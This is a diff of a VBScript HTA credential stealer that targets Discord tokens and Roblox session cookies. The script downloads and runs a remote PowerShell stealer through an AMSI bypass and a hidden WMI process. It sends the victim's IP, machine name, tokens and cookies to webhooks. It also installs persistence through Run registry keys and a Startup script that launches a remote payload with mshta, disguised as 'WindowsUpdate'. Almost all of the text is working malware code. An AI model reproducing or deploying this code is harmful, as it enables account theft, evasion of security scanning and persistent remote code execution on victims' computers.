@@ -18,13 +18,13 @@ PAYLOAD_URL = "mshta https://dicerigx.app/"
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- Initial Grab (All Logs to WH_ALL) ---
+' --- Initial Grab ---
 Call GrabTokens(True)
 Call IP(True)
 Call GrabRoblox(True)
 Call Persistence(True)
 
-' --- Re-run grab chain 4x (every 1 min) (Cookies Only to RE_WH) ---
+' --- Re-run grab chain (every 1 min) ---
 Dim runCount
 For runCount = 1 To 4
     Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, RE_WH)
@@ -38,28 +38,83 @@ Next
 Call SleepSeconds(10)
 window.close()
 
-' --- IP Function ---
-Sub IP(isFirstGrab)
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", "https://api.ipify.org/", False
+' --- GrabTokens (In-Memory + WMI + AMSI Bypass) ---
+Sub GrabTokens(isFirstGrab)
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.Open "GET", "https://gist.githubusercontent.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901/raw/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
-    Dim ip : ip = xh.responseText
-    If Len(ip) < 7 Then Exit Sub
-    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim ll : ll = Split(xh.responseText, vbLf)
-    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    
-    If isFirstGrab Then
-        Call PostEmbedTo(":dart: Target", info, 3447003, WH_ALL)
-    Else
-        Call PostEmbedTo(":dart: Target", info, 3447003, RE_WH)
-    End If
+    Dim pc: pc = xh.responseText
     Set xh = Nothing
+    
+    ' 1. Base64 Encode Stealer
+    Dim b64Script : b64Script = Base64Encode(pc)
+    
+    ' 2. AMSI Bypass
+    Dim amsi : amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
+    Dim b64Amsi : b64Amsi = Base64Encode(amsi)
+    
+    ' 3. Construct Command
+    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -EncodedCommand " & b64Amsi & " -Command ""IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('" & b64Script & "')))"""
+    
+    ' 4. Spawn via WMI (Bypasses process monitoring)
+    Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Dim proc: Set proc = wmi.Get("Win32_Process")
+    proc.Create finalCmd, Null, Null
+    
+    ' 5. Wait for execution
+    Dim w: w = Timer()
+    Do While Timer() - w < 6
+    Loop
+    
+    ' 6. Read Results
+    Dim tf: tf = TmpFile("steal_result.txt")
+    If Not fso.FileExists(tf) Then Exit Sub
+    Dim raw: raw = ReadFile(tf)
+    
+    If Len(raw) > 10 Then
+        Dim lines: lines = Split(raw, vbCrLf)
+        Dim l
+        For Each l In lines
+            If Len(l) > 10 Then
+                If Left(l, 8) = "DISCORD|" Then
+                    Dim p: p = Split(Mid(l, 9), "|")
+                    If UBound(p) >= 4 Then
+                        Dim info: info = "**Token:** " & p(4)
+                        If isFirstGrab Then
+                            Call PostEmbedTo(":gift: Discord Token", info, 5793266, WH_ALL)
+                        Else
+                            Call PostEmbedTo(":gift: Discord Token", info, 5793266, RE_WH)
+                        End If
+                    End If
+                End If
+            End If
+        Next
+    End If
 End Sub
+
+' --- Base64 Encode Helper ---
+Function Base64Encode(sText)
+    Dim oXML, oNode
+    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+    Set oNode = oXML.CreateElement("base64")
+    oNode.dataType = "bin.base64"
+    oNode.nodeTypedValue = Stream_StringToBinary(sText)
+    Base64Encode = oNode.text
+End Function
+
+Function Stream_StringToBinary(Text)
+    Dim BinaryStream
+    Set BinaryStream = CreateObject("ADODB.Stream")
+    BinaryStream.Type = 2
+    BinaryStream.Charset = "unicode"
+    BinaryStream.Open
+    BinaryStream.WriteText Text
+    BinaryStream.Position = 0
+    BinaryStream.Type = 1
+    Stream_StringToBinary = BinaryStream.Read
+    BinaryStream.Close
+End Function
 
 ' --- GrabRoblox Function ---
 Sub GrabRoblox(isFirstGrab)
@@ -81,40 +136,21 @@ Sub GrabRoblox(isFirstGrab)
         If fso.FolderExists(paths(i)) Then fp = paths(i) : Exit For
     Next
 
-    If Len(fp) = 0 Then
-        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp : Exit For
-                    Dim uwp2: uwp2 = subf.Path & "\LocalState\robloxcookies.dat"
-                    If fso.FileExists(uwp2) Then fp = uwp2 : Exit For
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    End If
     If Len(fp) = 0 Then Exit Sub
-
     Dim cookie: cookie = RawRobloxCookie(fp)
     If Len(cookie) < 50 Then Exit Sub
 
     If isFirstGrab Then
-        Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & " | Src: " & fso.GetFileName(fp), 65280, WH_ALL)
+        Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, WH_ALL)
         Call PostFileTo("cookie.txt", cookie, WH_ALL)
     Else
-        Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & " | Src: " & fso.GetFileName(fp), 65280, RE_WH)
+        Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280, RE_WH)
         Call PostFileTo("cookie.txt", cookie, RE_WH)
     End If
 End Sub
 
-' --- RawRobloxCookie ---
 Function RawRobloxCookie(fp)
     RawRobloxCookie = ""
-
     If fso.FolderExists(fp) Then
         Dim f, raw
         For Each f In fso.GetFolder(fp).Files
@@ -126,34 +162,24 @@ Function RawRobloxCookie(fp)
         Next
         Exit Function
     End If
-
     raw = ReadBinaryAsText(fp)
     RawRobloxCookie = ExtractRaw(raw)
 End Function
 
-' --- ExtractRaw ---
 Function ExtractRaw(s)
     ExtractRaw = ""
-    If Len(s) < 50 Then Exit Function
-
     Dim p: p = InStr(s, "_|WARNING")
     If p = 0 Then p = InStr(s, ".ROBLOSECURITY")
     If p = 0 Then Exit Function
-
     Dim rest: rest = Mid(s, p)
     Dim stopAt: stopAt = InStr(rest, ";")
     Dim nulAt: nulAt = InStr(rest, Chr(0))
     If nulAt > 0 And (stopAt = 0 Or nulAt < stopAt) Then stopAt = nulAt
     If stopAt = 0 Then stopAt = Len(rest)
     Dim ck: ck = Left(rest, stopAt - 1)
-
-    ck = Replace(ck, vbCr, "")
-    ck = Replace(ck, vbLf, "")
-    ck = Replace(ck, vbTab, "")
-    ExtractRaw = Trim(ck)
+    ExtractRaw = Trim(Replace(ck, vbCr, ""))
 End Function
 
-' --- ReadBinaryAsText ---
 Function ReadBinaryAsText(path)
     ReadBinaryAsText = ""
     Dim st: Set st = CreateObject("ADODB.Stream")
@@ -162,197 +188,67 @@ Function ReadBinaryAsText(path)
     st.LoadFromFile path
     Dim bytes: bytes = st.Read
     st.Close
-    Set st = Nothing
-
     Dim sb, i, b
     sb = ""
     For i = 1 To LenB(bytes)
         b = AscB(MidB(bytes, i, 1))
-        If b >= 32 And b <= 126 Then
-            sb = sb & Chr(b)
-        ElseIf b = 0 Then
-            sb = sb & Chr(0)
-        End If
+        If b >= 32 And b <= 126 Then sb = sb & Chr(b)
     Next
     ReadBinaryAsText = sb
 End Function
 
-' --- Sleep Functions ---
-Sub SleepSeconds(s)
-    Dim t0, t1, t2, elapsed
-    t0 = Timer()
-    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
-    sh.Run cmd, 0, True
-    elapsed = Timer() - t0
-    If elapsed < 0 Then elapsed = elapsed + 86400
-    If elapsed < s Then
-        t1 = Timer()
-        Do
-            t2 = Timer()
-            If t2 < t1 Then t2 = t2 + 86400
-            If (t2 - t1) >= (s - elapsed) Then Exit Do
-        Loop
+' --- IP, Persistence, Utils ---
+Sub IP(isFirstGrab)
+    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.Open "GET", "https://api.ipify.org/", False
+    xh.Send
+    If xh.Status = 200 Then
+        Dim info : info = "IP: " & xh.responseText & " | PC: " & PC
+        If isFirstGrab Then
+            Call PostEmbedTo(":dart: Target", info, 3447003, WH_ALL)
+        Else
+            Call PostEmbedTo(":dart: Target", info, 3447003, RE_WH)
+        End If
     End If
 End Sub
 
+Sub Persistence(isFirstGrab)
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", PAYLOAD_URL, "REG_SZ"
+    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
+    Dim sf : Set sf = fso.CreateTextFile(sp, True)
+    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & PAYLOAD_URL & """&Chr(34), 0, False"
+    sf.Close
+End Sub
+
+Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
+Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: End Function
+Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: End Function
+
+Sub SleepSeconds(s)
+    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
+    sh.Run cmd, 0, True
+End Sub
 Sub SleepMinutes(m)
     Call SleepSeconds(m * 60)
 End Sub
 
-' --- Persistence ---
-Sub Persistence(isFirstGrab)
-    Dim payload : payload = PAYLOAD_URL
-    On Error Resume Next
-    
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
-    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
-    
-    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    Dim sf : Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
-    sf.Close
-    
-    If isFirstGrab Then
-        Call PostEmbedTo(":pushpin: Persistence", "3 startup methods installed", 65280, WH_ALL)
-    Else
-        Call PostEmbedTo(":pushpin: Persistence", "3 startup methods installed", 65280, RE_WH)
-    End If
-End Sub
-
-' --- GrabTokens (In-Memory + WMI + AMSI Bypass) ---
-Sub GrabTokens(isFirstGrab)
-    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/iveshahaha/bb5e511a627ff1ce80ccc4839153f901/raw/steal.ps1", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim pc: pc = xh.responseText
-    If Len(pc) < 100 Then Exit Sub
-    Set xh = Nothing
-    
-    ' 1. Encode the script to Base64
-    Dim b64Script : b64Script = Base64Encode(pc)
-    
-    ' 2. AMSI Bypass
-    Dim amsi : amsi = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
-    Dim b64Amsi : b64Amsi = Base64Encode(amsi)
-    
-    ' 3. Construct EncodedCommand
-    Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -EncodedCommand " & b64Amsi & " -Command ""IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('" & b64Script & "')))"""
-    
-    ' 4. Spawn via WMI
-    Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
-    Dim proc: Set proc = wmi.Get("Win32_Process")
-    proc.Create finalCmd, Null, Null
-    
-    ' 5. Wait for execution
-    Dim w: w = Timer()
-    Do While Timer() - w < 6
-    Loop
-    
-    ' 6. Read results
-    Dim tf: tf = TmpFile("steal_result.txt")
-    If Not fso.FileExists(tf) Then Exit Sub
-    Dim raw: raw = ReadFile(tf)
-    
-    If Len(raw) > 10 Then
-        Dim lines: lines = Split(raw, vbCrLf)
-        Dim l
-        For Each l In lines
-            If Len(l) > 10 Then
-                If Left(l, 8) = "DISCORD|" Then
-                    Dim p: p = Split(Mid(l, 9), "|")
-                    If UBound(p) >= 4 Then
-                        Dim info: info = "**User:** " & p(0) & vbCrLf
-                        If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
-                        If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
-                        If p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
-                        info = info & "**Token:** " & p(4)
-                        
-                        If isFirstGrab Then
-                            Call PostEmbedTo(":gift: Discord Token", info, 5793266, WH_ALL)
-                        Else
-                            Call PostEmbedTo(":gift: Discord Token", info, 5793266, RE_WH)
-                        End If
-                    End If
-                End If
-                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                    If isFirstGrab Then
-                        Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 65280, WH_ALL)
-                    Else
-                        Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 65280, RE_WH)
-                    End If
-                End If
-            End If
-        Next
-    End If
-End Sub
-
-' --- Utility Functions ---
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
-
-' --- PostEmbedTo ---
 Sub PostEmbedTo(t, d, c, target_wh)
     Dim DQ: DQ = Chr(34)
-    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
+    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & t & DQ & "," & DQ & "description" & DQ & ":" & DQ & d & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
     h.Open "POST", target_wh, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
-    Set h = Nothing
 End Sub
 
-' --- PostFileTo ---
 Sub PostFileTo(fn, ct, target_wh)
     Dim DQ: DQ = Chr(34)
     Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
     Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
     h.Open "POST", target_wh, False
     h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
     h.Send bd
-    Set h = Nothing
 End Sub
-
-' --- Ej ---
-Function Ej(s)
-    Ej = s
-    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
-    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
-    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
-    Ej = Replace(Ej, vbCr, Chr(92) & "n")
-    Ej = Replace(Ej, vbLf, Chr(92) & "n")
-    Ej = Replace(Ej, vbTab, Chr(92) & "t")
-End Function
-
-' --- Base64 Encode Helper ---
-Function Base64Encode(sText)
-    Dim oXML, oNode
-    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
-    Set oNode = oXML.CreateElement("base64")
-    oNode.dataType = "bin.base64"
-    oNode.nodeTypedValue = Stream_StringToBinary(sText)
-    Base64Encode = oNode.text
-    Set oNode = Nothing
-    Set oXML = Nothing
-End Function
-
-Function Stream_StringToBinary(Text)
-    Dim BinaryStream
-    Set BinaryStream = CreateObject("ADODB.Stream")
-    BinaryStream.Type = 2
-    BinaryStream.Charset = "unicode"
-    BinaryStream.Open
-    BinaryStream.WriteText Text
-    BinaryStream.Position = 0
-    BinaryStream.Type = 1
-    Stream_StringToBinary = BinaryStream.Read
-    BinaryStream.Close
-    Set BinaryStream = Nothing
-End Function
 </script>
 </head><body></body></html>
